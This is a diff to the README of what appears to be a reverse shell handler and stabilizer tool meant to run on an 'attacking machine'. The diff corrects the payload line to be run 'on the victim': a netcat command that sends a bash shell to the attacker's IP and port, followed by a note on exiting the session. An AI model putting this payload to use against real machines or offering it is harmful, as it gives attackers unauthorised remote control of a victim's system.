@@ -5,8 +5,8 @@ A simple reverse shell handler and stabilizer
 
 You can run the script on the attacking machine to listen for incoming connections.
 
-Run this payload exmaple on the victim to start a reverse shell:
-`nc -c /bin/bash <port> <attacker_ip>`
+Run this payload on the victim to start a reverse shell:
+`nc -c /bin/bash <attacker_ip> <port>`
 
 **NOTE: To exit the program you have to enter "exit" in the shell session even if you can't read the input**
 
